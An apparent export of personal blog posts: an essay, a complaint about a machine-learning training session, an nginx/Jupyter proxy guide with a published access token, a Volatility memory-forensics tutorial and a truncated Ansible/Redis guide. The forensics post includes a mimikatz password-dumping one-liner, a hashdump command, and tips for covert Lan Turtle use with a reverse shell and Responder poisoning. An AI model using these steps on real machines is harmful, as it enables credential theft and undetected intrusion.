[{"title":"死亡诗社与博尔赫斯口述","url":"http://iami.xyz/2017/11/28/Life-me-up/","content":"<h4 id=\"前言：\"><a href=\"#前言：\" class=\"headerlink\" title=\"前言：\"></a>前言：</h4><p>书写和思考将人类与动物区分开来，也因此使我们变得不同。我们一边寄希望与未来，将文化和智慧传承下去。一边紧握当前，以求有所突破。数万年过来，人类文明得以发展。时光也仿佛就在史学家拿起笔写写画画的过程中逝去了，仿佛也就只能如此，但是事情并不是这样的，我们都知道，并不是这样。</p>\n<p>不论是生物在进(退)化，还是宇宙在衰变。从原始人嘿哟嘿哟的喊叫开始，我们就被赋予了自由的权利。在遥远的过去，吟游诗人的嘴中还传唱神话故事的时候，人类就已经从那些统治着人类的超凡力量下解放出来。我告诉自己，一个人应该去追究幸福和自由，去探求真相(请不要纠结于到底是权利还是权力)，我也这样告诉身边的朋友，希望他们去感受美好，真真切切，快快乐乐。然而，人生在向前的过程中越来越具有鲜明的目的性。有时候，会愈发让人疑惑。是否坚持品质能够更好？每当我问自己这个问题，我都会告诉自己，是的，你应该保持美好的品质。</p>\n<p>就像《凡人歌》所唱，你我皆凡人，生在人世间。然而，谁人不曾渴望放肆痛快去爱，活的痛快热烈呢？不曾渴望站在顶端放眼当世，看峰峦叠翠，跌宕起伏。然而大多人终将度过平凡的一生，穿梭于往来行人的街角巷尾。即便他们并不这么认为，却也无法改变这样的现实。这并不是说平凡不好，平凡，并没有什么不好。以前很多人嘲笑凤姐，拿她当做一个笑柄。凤姐说过，她花了人生中最美好的青春用于跨过这隐藏着于世间的沟壑。能坚持，极好。</p>\n<p>所以你问我，人生的意义到底在哪里，或许就在那里。23岁的时候和喜欢的人做喜欢的事情。</p>\n<h4 id=\"后记：\"><a href=\"#后记：\" class=\"headerlink\" title=\"后记：\"></a>后记：</h4><p>去年的12月1号，是我到上海工作的第一天。以后的博客可能会直接写在该博客github的<a href=\"https://github.com/mylamour/blog/issues\" target=\"_blank\" rel=\"noopener\">issues</a>里了。工作看起来很忙，却又仿佛没有成果。一个瓶颈到另一个瓶颈罢了。</p>\n<ul>\n<li><a href=\"https://github.com/mylamour/blog/issues/8\" target=\"_blank\" rel=\"noopener\">进击的安全</a> </li>\n<li><a href=\"https://github.com/mylamour/blog/issues/5\" target=\"_blank\" rel=\"noopener\">机器学习从头开始之基础套路</a></li>\n<li><a href=\"https://github.com/mylamour/blog/issues/3\" target=\"_blank\" rel=\"noopener\">翻了翻工作日志，写个总结吧</a></li>\n</ul>\n<h4 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考:\"></a>参考:</h4><p>前言来自琐琐碎碎读过的书和记不清的内容</p>\n<ul>\n<li>《神话与诗》</li>\n<li>《博尔赫斯：口述》</li>\n<li>《伊利亚特》</li>\n<li>《死亡诗社》</li>\n<li>《凡人歌》</li>\n</ul>\n<p>后记来自工作和学习,知识的积累需要时间，慢慢沉淀方可。能否如尝我愿，尚未可知。</p>\n","categories":["HowTo"],"tags":["漫漫人生路"]},{"title":"第一次机器学习培训总结","url":"http://iami.xyz/2017/09/14/Machine-learning-training-for-nothing/","content":"<h4 id=\"前言：\"><a href=\"#前言：\" class=\"headerlink\" title=\"前言：\"></a>前言：</h4><p>本文<a href=\"/assets/ml_training.pptx\">无干货</a>，吐槽加扯淡。</p>\n<p>到公司后开始组织技术分享也有一段时间了。本着好意，本着分享，想去提高大家的水平。于是呢，就在上周四，我去给公司一干同事讲了一节课机器学习。题目是上上周四定的，准备了4，5天希望能够尽可能的通俗的基础的去引起他们的兴趣，希望带他们入门。然而事情怎么可能像想象的那么样顺利呢？然后我才明白了任何看起来正常的事情背后需要付出多大的努力。</p>\n<p>在之前的公司里，搞搞技术分享很正常，大家也很乐意，会在一定时间内集中精神讲完，都很上进。在这里，一万个不乐意，玩手机的玩手机，假寐的假寐，<br>真是操蛋。</p>\n<h4 id=\"正文：\"><a href=\"#正文：\" class=\"headerlink\" title=\"正文：\"></a>正文：</h4><p><strong>[消耗]</strong>：<br>5天，完整2天时间，3天每天3小时以上。</p>\n<blockquote>\n<p>两个数据集:</p>\n</blockquote>\n<ul>\n<li>Mnist </li>\n<li>SMS  </li>\n</ul>\n<blockquote>\n<p>三种算法:</p>\n</blockquote>\n<ul>\n<li>KNN</li>\n<li>SVM</li>\n<li>Naive Bayes</li>\n</ul>\n<blockquote>\n<p>两种实现:</p>\n</blockquote>\n<ul>\n<li>Scikit-Learn</li>\n<li>Tensorflow</li>\n</ul>\n<blockquote>\n<p>其他</p>\n</blockquote>\n<ul>\n<li>注册了一个域名</li>\n<li>部署了聊天室作为课前后讨论</li>\n<li>部署了Jupyter给他们用，运行在线示例</li>\n<li>打印资料，提前4天提供。</li>\n</ul>\n<p>我准备的是两个示例，<code>mnist</code>手写数据集识别和<code>SMS</code>垃圾文本分类。用的算法也是最简单的，<code>KNN/SVM</code>(Mnist),NaiveBayes(SMS text),分别实现了<code>tensorflow</code>版本和<code>scikit-learn</code>两个版本。主要讲的两个算法是<code>KNN</code>和<code>Bayes</code>。</p>\n<p><strong>[收获]</strong>：<br>&gt;</p>\n<ul>\n<li>加深了对这些概念和算法的掌握，说明和别人讲东西，的确会提高自己的认知。</li>\n<li>应该得罪了几个人，不过我根本不在乎。如果认知在一个层次的话，就不会这样了。</li>\n<li>做了大学到现在最长的一次PPT，知道自己很傻逼很浅</li>\n<li>要成大事，还需要努力努力再努力</li>\n</ul>\n<h4 id=\"后记：\"><a href=\"#后记：\" class=\"headerlink\" title=\"后记：\"></a>后记：</h4><p>后来，讲完之后，大家还讨论了一下这个技术分享的事情。最后呢。</p>\n<ul>\n<li><p>见贤思齐焉，见不贤而内自省也。</p>\n<blockquote>\n<p>你心里就没有B数吗？都不能上进些？</p>\n</blockquote>\n</li>\n<li><p>大家的水平真是参差不齐(一同事说考虑到这多同事的水平)</p>\n<blockquote>\n<p>我不是讽刺谁，在座的水平都是垃圾。</p>\n<blockquote>\n<p>要是吹牛逼有用，那你们的水平真是比我高多了。</p>\n</blockquote>\n</blockquote>\n</li>\n</ul>\n<p>PS：突然发现上面有歧义，以上的一级引用意指这句话可不可这以理解？顺便加上逗比的文字表情包。并没有讽刺谁。为了讽刺谁就没有意义了。只是为了自省。(update 09.20)</p>\n<ul>\n<li><p>第二天早上老板说，这效果不好，感觉大家没入门。</p>\n<blockquote>\n<p>难道要我喂不成，什么都不看，分享时也不听。能入P的门，何况这本身也不是你一节课就能入得门。我自己学了那么久，也没敢说自己入门。</p>\n<blockquote>\n<p>我把PPT丢给学弟，学弟都能感到这是在是一个入门级别的东西。所以，是我讲的不够简单，还是学弟太聪明？<br>前两次扯一个异常与错误处理都能吹2个半小时牛逼，扯到天南地北的。</p>\n</blockquote>\n</blockquote>\n</li>\n<li><p>我实在不明白为什么有的人什么都不会又tm不想提高自己，不愿意接触不会的知识。</p>\n<blockquote>\n<p>想有什么用(海知时杨老师给我讲的，鉴于杨老师的特质，时刻提醒自己)</p>\n</blockquote>\n</li>\n</ul>\n<p><img src=\"/images//caodandefenxiang.png\" alt=\"img\"></p>\n<ul>\n<li>现在看来我们实验室出来的，水平都还是可以的，</li>\n</ul>\n<p>敬，自由。</p>\n","categories":["学习数据挖掘的路上"],"tags":["学习笔记","机器学习"]},{"title":"Nginx SubDomain and Proxypass Jupyter notebook","url":"http://iami.xyz/2017/09/10/nginx-subdomain-and-proxy-jupyter/","content":"<p>It was being executed it in my DigitOcean Machine Learning AI Droplet.</p>\n<p>Firstly, Parser a domain name to your vps, (add A record, also your subdomain). Now we edit the config file in our configure file. locate at in <code>/etc/nginx/conf.d/yourselfdomain.conf</code></p>\n<p>for example , in my subdomain, i edit the file <code>/etc/nginx/conf.d/mldl.conf</code>, and change it to:</p>\n<blockquote>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen 80;</span><br><span class=\"line\">    server_name irc.mldl.site;</span><br><span class=\"line\"></span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">        proxy_pass http://localhost:3000;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>Note:Jupyter token was being writted in <code>~/.bashrc</code>, and was runing as service(also allow root acces),if your want stop it, and run it on yourself directory.Just follow the step:</p>\n<p>step 1:</p>\n<blockquote>\n<p><code>systemctl stop jupyter.service</code></p>\n</blockquote>\n<p>step 2:</p>\n<blockquote>\n<p><code>jupyter-notebook --NotebookApp.token=2bab1e75-22c8-4328-b791-83a39a7170a7 --no-browser --port 8080 --ip=0.0.0.0</code></p>\n<p>if you need to allow root access,</p>\n<p><code>jupyter-notebook --NotebookApp.token=2bab1e75-22c8-4328-b791-83a39a7170a7 --no-browser --port 8080 --ip=0.0.0.0 --allow-root</code></p>\n</blockquote>\n<p>But there was a problem, Jupyter use the ajax as a response. Nginx use proxy head to solve the cross domain problem. Now, the new configure file looke like this:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen 80;</span><br><span class=\"line\">    server_name jupyter.mldl.site;</span><br><span class=\"line\"></span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">        proxy_pass http://localhost:8080;</span><br><span class=\"line\">        add_header Access-Control-Allow-Origin: *;</span><br><span class=\"line\">        proxy_set_header X-Real_IP $remote_addr;</span><br><span class=\"line\">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class=\"line\">        proxy_set_header X-NginX-Proxy true;</span><br><span class=\"line\">        proxy_ssl_session_reuse off;</span><br><span class=\"line\">        proxy_set_header Host $http_host;</span><br><span class=\"line\"></span><br><span class=\"line\">        proxy_redirect off;</span><br><span class=\"line\">        proxy_http_version 1.1;</span><br><span class=\"line\">        proxy_set_header Upgrade $http_upgrade;</span><br><span class=\"line\">        proxy_set_header Connection &quot;upgrade&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","categories":["HowTo"],"tags":["小手段"]},{"title":"内存取证,密码提取以及Volatility的使用","url":"http://iami.xyz/2017/08/25/Volatility-Memory-Analysis/","content":"<h4 id=\"前言-简介\"><a href=\"#前言-简介\" class=\"headerlink\" title=\"前言 : 简介\"></a>前言 : 简介</h4><p>这个月开始使用<code>Volatility</code>进行内存取证，以及密码提取相关。还顺带玩了把 <code>Lan Turtle</code>以及<code>Leonarde</code>。 <code>Leonarde</code>只是用来模拟键盘，算是比较限制吧。<code>Lan Turtle</code>则功能十分强大。</p>\n<p><code>Volatility</code>可谓享有盛名，在我使用的过程中，越发佩服作者。厉害了。</p>\n<h4 id=\"Step-1-获取内存镜像\"><a href=\"#Step-1-获取内存镜像\" class=\"headerlink\" title=\"Step 1 : 获取内存镜像\"></a>Step 1 : 获取内存镜像</h4><p>要想对镜像进行分析，首先肯定是要获取到内存镜像</p>\n<ul>\n<li>windows </li>\n</ul>\n<blockquote>\n<p>非常简单,直接使用<a href=\"https://github.com/mylamour/-_--Forensics-Tools/raw/master/utils/DumpIt.exe\" target=\"_blank\" rel=\"noopener\">dumpit.exe</a>即可,对远程的话可以采用<code>F-Response</code>. <code>Windows</code>下其实有很多的工具可以进行内存镜像。这里就不一一介绍了。</p>\n</blockquote>\n<ul>\n<li>linux<blockquote>\n<p>稍微复杂一点需要使用到<code>LIME</code>,之前还可以用<code>dd</code>,但是现在<code>linux</code>不允许<code>dd</code>读取超过<code>1M</code>的空间。</p>\n</blockquote>\n</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git <span class=\"built_in\">clone</span> https://github.com/limetext/lime</span><br><span class=\"line\">$ <span class=\"built_in\">cd</span> src</span><br><span class=\"line\">$ make</span><br><span class=\"line\">....</span><br><span class=\"line\">  CC [M]  /home/mhl/Downloads/src/tcp.o</span><br><span class=\"line\">  CC [M]  /home/mhl/Downloads/src/disk.o</span><br><span class=\"line\">....</span><br><span class=\"line\">$ sudo insmod lime-4.10.0-30-generic.ko <span class=\"string\">\"path=/home/mour/ubuntu_test1704.lime format=lime\"</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"Step-2-分析的前提条件，要有个profile\"><a href=\"#Step-2-分析的前提条件，要有个profile\" class=\"headerlink\" title=\"Step 2 : 分析的前提条件，要有个profile\"></a>Step 2 : 分析的前提条件，要有个<code>profile</code></h4><p>得到内存镜像之后，可以准备进行分析了。而进行分析的前提的条件是根据<code>profile</code>文件。<code>profile</code>文件其实就是将内存映射文件和调试信息压缩放在一起，由<code>volatility</code>然后框架进行读取。<code>Windows</code>和<code>Linux</code>有一点不一样，就是<code>Windows</code>下的<code>profile</code>的可以迁移使用，所以有时候也会建议好几种版本。但是<code>Linux</code>下的则不一样，必须是要求：</p>\n<ul>\n<li>CPU架构一致</li>\n<li>内核版本一致</li>\n<li>发行版本一致</li>\n</ul>\n<p>官网给出的<a href=\"https://github.com/volatilityfoundation/volatility/wiki/Linux\" target=\"_blank\" rel=\"noopener\">制作教程</a>在这里，但是已经有些不适用了。目前已经有更加方便的方法了。</p>\n<ol>\n<li>查看内核版本，安装下相应的<code>Header</code>文件</li>\n</ol>\n<blockquote>\n<p><img src=\"/images//volatility/0814jietu2.png\" alt=\"image\"> </p>\n</blockquote>\n<ol>\n<li>制作<code>dwarf</code>文件</li>\n</ol>\n<blockquote>\n<p>这一步在原始教程里十分的繁复，其实新版本的<code>volatility</code>早已经写好了一个<code>makefile</code>脚本进行整个套路。</p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ <span class=\"built_in\">cd</span> volatility/tools/linux</span><br><span class=\"line\">$ make</span><br></pre></td></tr></table></figure>\n<ol>\n<li>合并<code>System Map</code>文件和<code>dwarf</code>文件</li>\n</ol>\n<p><img src=\"/images//volatility/0814jietu1.png\" alt=\"image\"></p>\n<ol>\n<li>将<code>profile</code>放置在对应的文件夹下<code>volatility/volatility/plugins/overlays/</code>,但是记住，千万不要一次性加载<code>profile</code>文件，需要什么加载什么。因为<code>volatility</code>会加载所有插件，所以导致十分慢。</li>\n</ol>\n<h4 id=\"Step-3-自古深情留不住-总是套路得人心\"><a href=\"#Step-3-自古深情留不住-总是套路得人心\" class=\"headerlink\" title=\"Step 3 : 自古深情留不住,总是套路得人心\"></a>Step 3 : 自古深情留不住,总是套路得人心</h4><p>常规套路:扫描得到内存镜像信息(已经知道就不需要了，可以直接指定<code>profile</code>了)。</p>\n<p>然后使用对应的<code>profile</code>进行分析。还可以加载不同的插件进行相应的分析。</p>\n<ul>\n<li>查看支持的Profile</li>\n</ul>\n<blockquote>\n<p><code>python vol.py --info | grep Linux</code></p>\n</blockquote>\n<p>可以将自制的<code>profile</code>放置在<code>volatility/plugins/overlays/</code>下面，然后使用命令查看<code>profile</code>名称并进行使用</p>\n<p>1.Windows 平台</p>\n<ul>\n<li>Dump 内存中的所有dll, 到本机</li>\n</ul>\n<blockquote>\n<p><code>python vol.py -f win7.vmem --profile=Win7SP1x64 dlldump -D dlls/</code></p>\n</blockquote>\n<ul>\n<li>查看Windows的进程</li>\n</ul>\n<blockquote>\n<p><code>python vol.py -f win7.vmem --profile=Win7SP1x64 pslist</code></p>\n</blockquote>\n<ul>\n<li>查看所有的网络通信</li>\n</ul>\n<blockquote>\n<p><code>python vol.py -f win7.vmem --profile=Win7SP1x64 netscan</code></p>\n</blockquote>\n<ul>\n<li>查看所有的句柄</li>\n</ul>\n<blockquote>\n<p><code>python vol.py -f win7.vmem --profile=Win7SP1x64 handles</code></p>\n</blockquote>\n<ul>\n<li>查看命令行历史</li>\n<li>查看注册表，等等等等</li>\n</ul>\n<p>其实我们从<code>wiki</code>里就可以看到，volatility支持的操作，主要感兴趣的在(以下为<code>windows</code>下)</p>\n<ul>\n<li>Image Identification</li>\n<li>Processes and DLLs</li>\n<li>Process Memory</li>\n<li>Kernel Memory and Objects</li>\n<li>Networking</li>\n<li>Registry</li>\n<li>Crash Dumps, Hibernation, and Conversion</li>\n<li>File System</li>\n<li>Miscellaneous</li>\n</ul>\n<p>一个个列举也没什么意思，还有就是<code>Volshell</code>比较有用，当然配合<code>yara</code>还可以检查内存是否存在病毒。</p>\n<p><code>volshell</code>可以对内存镜像进行交互式的操作，命令行能干的<br>shell里都能够干。<a href=\"https://github.com/volatilityfoundation/volatility/wiki/Command-Reference#volshell\" target=\"_blank\" rel=\"noopener\">原文</a>照抄一下：</p>\n<ul>\n<li>List processes</li>\n<li>Switch into a process’s context</li>\n<li>Display types of structures/objects</li>\n<li>Overlay a type over a given address</li>\n<li>Walk linked lists</li>\n<li>Disassemble code at a given address</li>\n</ul>\n<h4 id=\"Step-4-提取密码和一些好玩的套路\"><a href=\"#Step-4-提取密码和一些好玩的套路\" class=\"headerlink\" title=\"Step 4 : 提取密码和一些好玩的套路\"></a>Step 4 : 提取密码和一些好玩的套路</h4><p>提取系统密码，是最基本的啦，Windows的登录密码加密方式有<code>NTLMV1</code>和<code>NTLMv2</code>。<code>Windows 7</code>及以前的是<code>NTLMV1</code>实现的，<code>python</code>中可以利用这样的代码生成</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> hashlib,binascii</span><br><span class=\"line\">hash = hashlib.new(<span class=\"string\">'md4'</span>, <span class=\"string\">\"sad\"</span>.encode(<span class=\"string\">'utf-16le'</span>)).digest()</span><br><span class=\"line\"><span class=\"keyword\">print</span> (binascii.hexlify(hash))</span><br></pre></td></tr></table></figure>\n<p>提取方式:<br><code>$ python -f xxxx.vmem --profile=Win7SP1x64 hashdump</code><br>之前文档里面一直提到需要首先找到基地址，然后找到偏移地址才可以进行。实践发现并不需要。</p>\n<p>当然在有管理员权限的情况下，可以直接使用<code>mimikatz</code>(<code>windows</code>)提取。即可以交互进行，也可以一行命令行提取(这个是使用了<code>log</code>选项)。<br><code>mimikatz logs &quot;privilege::debug&quot;;sekurlsa::logonpasswords</code> 想想使用<code>Leonarde</code>加在一起是不是猥琐的不行，不过<code>leonarde</code>模拟虚拟键盘也有一大堆的问题。我是参考的<a href=\"http://www.freebuf.com/sectool/107242.html\" target=\"_blank\" rel=\"noopener\">这篇文章</a>,对我来说还好吧，改了改代码能用。不知道为什么评论区有那么多问题。不过确实不少问题，还好都解决掉了。</p>\n<p>提取浏览器密码:</p>\n<blockquote>\n<p>得到浏览器进程，使用<code>vad</code>插件<code>dump</code>出整个进程空间，然后分析<code>grep</code>搜索关键字。</p>\n</blockquote>\n<p>其实最简单的就是使用<code>WinHex</code>直接搜索内存镜像，使用<code>grep</code>也一样。</p>\n<p>过锁屏提取密码:</p>\n<p>使用<code>Lan turtle</code>,这个是真邪恶，同时还可以用来过锁屏，利用的是<code>Responder</code>认证机制漏洞。不过呢,利用条件也很苛刻，起码在win7上，不能有选择网络位置，否则不行。只有无线的话，插上去也不行。但是<code>hak5</code>上演示的时候有的是可以的。<br>这个我觉得<code>Lan Turtle</code>的好处就是隐藏自己，探视内网。我不建议直接启用<code>Quick Cred</code>,应该只反向一个<code>ssh</code>或者<code>meterpreter</code>,然后再去启用<code>Reponder</code>    去投毒。<br>避免被发现。挑一个时间去执行。当然这个对<code>linux</code>没有用。我也只在一台<code>win10</code>上测试成功了。</p>\n<h4 id=\"Step-5-病毒分析与重建二进制\"><a href=\"#Step-5-病毒分析与重建二进制\" class=\"headerlink\" title=\"Step 5 : 病毒分析与重建二进制\"></a>Step 5 : 病毒分析与重建二进制</h4><p>VAD(Virtual Address Descriptor)是内存取证中的重要参考。</p>\n<ul>\n<li><a href=\"https://github.com/volatilityfoundation/volatility/wiki/Command-Reference-Mal\" target=\"_blank\" rel=\"noopener\">病毒分析</a>:</li>\n</ul>\n<ol>\n<li>命令行配合<code>yara</code>去扫描规则</li>\n<li>主要进程分析，多余dll分析，以及其他。进程注入分析，网络行为，等等吧。手动。。。。还可以绘制出<code>vadmap</code>的图，可以用<code>graphviz</code>打开的。</li>\n</ol>\n<ul>\n<li>创建二进制<br>其实不应该单独拿出来了讲，听着名字很牛逼的感觉，其实就是抽取进程，和前面的一样的。使用<code>vaddump</code></li>\n</ul>\n<h4 id=\"Not-FAQ\"><a href=\"#Not-FAQ\" class=\"headerlink\" title=\"Not FAQ\"></a>Not FAQ</h4><ul>\n<li>内存镜像时会捕捉到宿主机的整个镜像，如果宿主机中有虚拟机正在运行，同样也会被捕捉到。现实中也常常是这样，那么此时应该怎么办?</li>\n</ul>\n<blockquote>\n<p>可以先解压出<code>vmware</code>进程的地址空间，然后再去用对应<code>profile</code>分析对应的<code>Vmware</code>内的操作系统。</p>\n</blockquote>\n<p><img src=\"/images//volatility/0817jietu.png\" alt=\"image\"></p>\n<ul>\n<li><code>Linux Kernel 4.8</code>以上的内核采用了随机内存地址，此时该怎么办？</li>\n</ul>\n<p><img src=\"/images//volatility/0818jietu.png\" alt=\"image\"></p>\n<ul>\n<li><p>文件分散存储在磁盘上，运行时读取到一段连续的内存中。但是<code>PE</code>文件是由操作系统读取到内存中，所以内存映射稍有不同，具体哪里不同，我也没看到资料。</p>\n</li>\n<li><p><code>raw</code> 与 <code>dmp</code> 与 <code>vmem</code></p>\n</li>\n<li><p>注意看一下，<code>profile</code>压缩包里面是否需要有目录结构。我之前没有加也可以用，但是自带的<code>profile</code>里有的。</p>\n</li>\n<li><p><code>powershell.exe -command start-process powershell -verb runAs</code></p>\n</li>\n<li><p><code>Rekall</code>也是很不错的内存取证框架。</p>\n</li>\n</ul>\n<h4 id=\"Conclusion：\"><a href=\"#Conclusion：\" class=\"headerlink\" title=\"Conclusion：\"></a>Conclusion：</h4><ul>\n<li><a href=\"https://github.com/iAbadia/Volatility-Plugin-Tutorial\" target=\"_blank\" rel=\"noopener\">如何编写<code>volatility</code>插件</a></li>\n</ul>\n<p>今天试用期结束，又要开始新的项目了<code>windows木马检测</code>。逐渐发现了公司的一些问题。公司比较缺乏技术交流的氛围。自己便和另外一个同事组织了一下搞起了这个。这其实从另一个方向说明了越是那些正常的，越是难以实现。必须是经历过许多的坎坷(或者不需要)才能建立出一个给人感觉自然的，方便的，正常的。自己以前一直觉得很正常的东西，推行起来还是有问题的。<br>唉，东西一段时间不用就会忘掉。其他几门语言忘掉了许多了。</p>\n<p>公司里面有个大神每周来着分享，据说有20年互联网的经验，是老板请的贵客。之前还在启明星辰带过团队，履历挺牛逼的，大家也都觉得很牛逼的。我也觉得他<code>C++</code>和<code>Python</code>很牛逼。盛名之下，其实难副。也是一言难尽吧。人倒还是不错。</p>\n<h4 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h4><ul>\n<li><a href=\"https://github.com/504ensicsLabs/LiME\" target=\"_blank\" rel=\"noopener\">LIME</a></li>\n<li><a href=\"https://www.f-response.com/software/ee\" target=\"_blank\" rel=\"noopener\">F-Response</a></li>\n<li><a href=\"https://github.com/volatilityfoundation/volatility/wiki/\" target=\"_blank\" rel=\"noopener\">Volatility Wiki</a></li>\n<li><a href=\"https://github.com/volatilityfoundation/volatility/wiki/Command-Reference-Mal\" target=\"_blank\" rel=\"noopener\">Volatility Malware Find</a></li>\n<li><a href=\"http://www.hackingarticles.in/volatility-an-advanced-memory-forensics-framework/\" target=\"_blank\" rel=\"noopener\">volatility simple tutorial</a></li>\n<li><a href=\"https://github.com/volatilityfoundation/volatility/wiki/Linux#creating-a-new-profile\" target=\"_blank\" rel=\"noopener\">Creating a profile</a></li>\n<li><a href=\"\">PEB</a></li>\n<li><a href=\"http://lilxam.tuxfamily.org/blog/?p=326&amp;lang=en\" target=\"_blank\" rel=\"noopener\">VAD: Understanding Virtual Address Descriptors</a></li>\n<li><a href=\"https://msdn.microsoft.com/en-us/library/ms810627.aspx\" target=\"_blank\" rel=\"noopener\">Managing Virtual Memory</a></li>\n<li><a href=\"http://project-rainbowcrack.com/\" target=\"_blank\" rel=\"noopener\">rainbow crack</a></li>\n<li><a href=\"https://bneuburg.github.io/volatility/kaslr/2017/04/26/KASLR1.html\" target=\"_blank\" rel=\"noopener\">Kernel Address Space Randomization in Linux or how I made Volatility bruteforce the page tables</a></li>\n<li><a href=\"http://wiki.dwarfstd.org/index.php?title=Libdwarf_And_Dwarfdump#What_is_dwarfdump\" target=\"_blank\" rel=\"noopener\">What is dwarfdump</a></li>\n<li><a href=\"https://lanturtle.com/\" target=\"_blank\" rel=\"noopener\">LAN Turtle</a></li>\n<li><a href=\"https://github.com/mylamour/-_--Forensics-Tools/\" target=\"_blank\" rel=\"noopener\">-_–Forensics-Tools</a></li>\n<li><a href=\"https://github.com/gentilkiwi/mimikatz\" target=\"_blank\" rel=\"noopener\">mimikatz</a></li>\n<li><a href=\"http://carnal0wnage.attackresearch.com/2014/05/mimikatz-against-virtual-machine-memory.html\" target=\"_blank\" rel=\"noopener\">mimikatz取虚拟机内存镜像</a></li>\n<li><a href=\"https://github.com/SpiderLabs/Responder\" target=\"_blank\" rel=\"noopener\">Responder</a></li>\n<li><a href=\"https://room362.com/post/2016/snagging-creds-from-locked-machines/\" target=\"_blank\" rel=\"noopener\">snagging-creds-from-locked-machines</a></li>\n</ul>\n","categories":["HowTo"],"tags":["学习笔记"]},{"title":"Ansible与Redis集群的搭建","url":"http://iami.xyz/2017/08/19/Ansible-And-Redis-Cluster/","content":"<h4 id=\"前言-就是废话啦\"><a href=\"#前言-就是废话啦\" class=\"headerlink\" title=\"前言 : 就是废话啦\"></a>前言 : 就是废话啦</h4><p>之前为了给vultr写一篇文档<code>how to build a redis cluster in vulter</code>，后来由于语法问题没有通过，就搁置了。也没有翻译回来贴在自己的博客上。所以还是收拾一下吧。其实只是为了搭建<code>pyspider</code>分布式的。</p>\n<h4 id=\"正文-什么是什么东西\"><a href=\"#正文-什么是什么东西\" class=\"headerlink\" title=\"正文 : 什么是什么东西\"></a>正文 : 什么是什么东西</h4><p>用<code>ansible</code>，是latern哥推荐的，我呢是从<code>vagrant</code>过度过来的。他们都是基于<code>ssh</code>的。安装很简单<code>pip install ansible</code>就行了。<br><code>redis</code> 用过吧，缓存队列是最常用的功能。</p>\n<ol>\n<li>创建一个单独的<code>ansible</code>用户，但是记住，要在创建用户的同时创建主目录，负责就很蛋疼了。当时试了很久不行，权限拒绝，后来才发现我添加用户的时候没有创建主目录，因此导致了不能用。主机这一块暂时不讲了，使用<code>ssh</code>秘钥去创建批量机器，或者以一个为模板机器去创建。</li>\n</ol>\n<p>2.当你去连接slave节点时，由于需要ansible的密码，在第一次的时候，会要求验证ssh 指纹，方便起见，可以来一个<code>playbook</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env ansible-playbook</span><br><span class=\"line\">---</span><br><span class=\"line\">- name: accept ssh fingerprint automatically for the first time</span><br><span class=\"line\">  hosts: all</span><br><span class=\"line\">  connection: local</span><br><span class=\"line\">  gather_facts: False</span><br><span class=\"line\"></span><br><span class=\"line\">  tasks:</span><br><span class=\"line\">    - name: &quot;check if known_hosts contains server&apos;s fingerprint&quot;</span><br><span class=\"line\">      command: ssh-keygen -F &#123;&#123; inventory_hostname &#125;&#125;</span><br><span class=\"line\">      register: keygen</span><br><span class=\"line\">      failed_when: keygen.stderr != &apos;&apos;</span><br><span class=\"line\">      changed_when: False</span><br><span class=\"line\"></span><br><span class=\"line\">    - name: fetch remote ssh key</span><br><span class=\"line\">      command: ssh-keyscan -T5 &#123;&#123; inventory_hostname &#125;&#125;</span><br><span class=\"line\">      register: keyscan</span><br><span class=\"line\">      